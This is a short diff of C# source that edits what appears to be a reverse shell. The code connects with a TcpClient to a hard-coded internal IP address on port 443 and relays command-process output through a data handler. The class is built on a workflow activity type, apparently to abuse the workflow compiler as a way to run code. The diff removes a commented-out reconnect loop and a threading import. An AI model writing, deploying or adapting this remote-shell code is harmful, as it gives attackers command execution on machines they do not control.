@@ -7,7 +7,6 @@ using System.Net;
 using System.Net.Sockets;
 using System.Workflow.Activities;
 
-using System.Threading;
 
 	public class Program : SequentialWorkflowActivity
 	{
@@ -15,10 +14,7 @@ using System.Threading;
 
 		public Program()
 		{
-		/*while(true)
-		{
-			Thread.Sleep(20);
-		*/	
+	
 			using(TcpClient client = new TcpClient("172.26.20.135", 443))
 			{
 				using(Stream stream = client.GetStream())
@@ -49,8 +45,6 @@ using System.Threading;
 					}
 				}
 			}
-			
-		/*	} */
 		}
 
 		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
